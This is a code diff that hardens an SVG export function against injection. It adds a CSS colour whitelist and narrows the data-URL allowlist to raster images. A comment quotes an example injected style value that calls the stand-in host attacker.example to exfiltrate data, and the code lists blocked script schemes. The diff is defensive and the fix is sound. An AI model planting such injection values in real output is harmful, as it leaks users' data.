@@ -371,9 +371,18 @@ function svgForObject(
   // are safe.
   switch (o.type) {
     case "sticky":
+      // SECURITY: `o.textColor` lands INSIDE a `style="..."` declaration
+      // — escapeAttr only HTML-encodes the value, but the browser then
+      // CSS-parses the result, where a value like
+      //   red;background-image:url(http://attacker.example/?steal=…)
+      // would inject an extra `background-image` rule (data exfiltration
+      // when the exported SVG is opened in a browser). object-validator
+      // already restricts colors at ingest, but apply the strict CSS
+      // color whitelist here too — defense-in-depth and protection for
+      // legacy data that pre-dates the validator.
       return `<g><rect x="${x}" y="${y}" width="${o.w}" height="${o.h}" fill="${escapeAttr(o.color)}" rx="6" />
 <foreignObject x="${x}" y="${y}" width="${o.w}" height="${o.h}">
-  <div xmlns="http://www.w3.org/1999/xhtml" style="font:14px sans-serif;color:${escapeAttr(o.textColor ?? "#0b0f17")};padding:10px;box-sizing:border-box;white-space:pre-wrap;word-wrap:break-word;">${escapeXml(o.content)}</div>
+  <div xmlns="http://www.w3.org/1999/xhtml" style="font:14px sans-serif;color:${safeStyleColor(o.textColor, "#0b0f17")};padding:10px;box-sizing:border-box;white-space:pre-wrap;word-wrap:break-word;">${escapeXml(o.content)}</div>
 </foreignObject></g>`;
     case "rect":
       return `<rect x="${x}" y="${y}" width="${o.w}" height="${o.h}" fill="${escapeAttr(o.fill ?? "none")}" stroke="${escapeAttr(o.stroke ?? "#475569")}" stroke-width="${o.strokeWidth ?? 1}" />`;
@@ -533,6 +542,24 @@ function escapeAttr(s: string | number | undefined | null): string {
 }
 
 /**
+ * Strict CSS color whitelist for values that flow into a `style=` attribute
+ * fragment (NOT an SVG `fill=`/`stroke=` attribute — the browser parses
+ * those as CSS color references and ignores garbage). Used by the sticky
+ * foreignObject path where the color lands inside `style="...color:X..."`.
+ * A value containing `;` would otherwise inject extra declarations.
+ * Mirrors the SAFE_CSS_COLOR_RE in object-validator.ts.
+ */
+function safeStyleColor(color: string | null | undefined, fallback: string): string {
+  if (typeof color !== "string") return fallback;
+  const trimmed = color.trim();
+  if (trimmed.length === 0 || trimmed.length > 64) return fallback;
+  if (!/^(?:#[0-9a-fA-F]{3,8}|rgba?\([0-9.,%\s]+\)|hsla?\([0-9.,%\s]+\)|[a-zA-Z]{1,32})$/.test(trimmed)) {
+    return fallback;
+  }
+  return trimmed;
+}
+
+/**
  * Reject URLs that would execute script when the exported SVG is opened.
  * Whitelist: http, https, data:image/* (for inline images). Anything else
  * — javascript:, vbscript:, data:text/html, etc. — gets blanked out so the
@@ -542,8 +569,16 @@ function sanitizeUrl(url: string): string {
   if (typeof url !== "string") return "";
   const trimmed = url.trim();
   if (/^https?:/i.test(trimmed)) return trimmed;
-  if (/^data:image\//i.test(trimmed)) return trimmed;
-  // Anything else (javascript:, file:, data:text/html, vbscript:) → blank.
+  // SECURITY: narrow to KNOWN raster formats only. The previous
+  // `data:image/*` wildcard accepted `data:image/svg+xml` — and SVG
+  // can contain inline `<script>` blocks that execute when the
+  // exported SVG document is opened in a browser. Mirrors the same
+  // allowlist used by `safeImageSrc` (object-renderer.tsx) and
+  // `isSafeUrl` (clipboard.ts) so the three URL trust boundaries can't
+  // drift apart.
+  if (/^data:image\/(?:png|jpe?g|webp|gif|avif);base64,/i.test(trimmed)) return trimmed;
+  // Anything else (javascript:, file:, data:text/html, vbscript:,
+  // data:image/svg+xml) → blank.
   return "";
 }
 
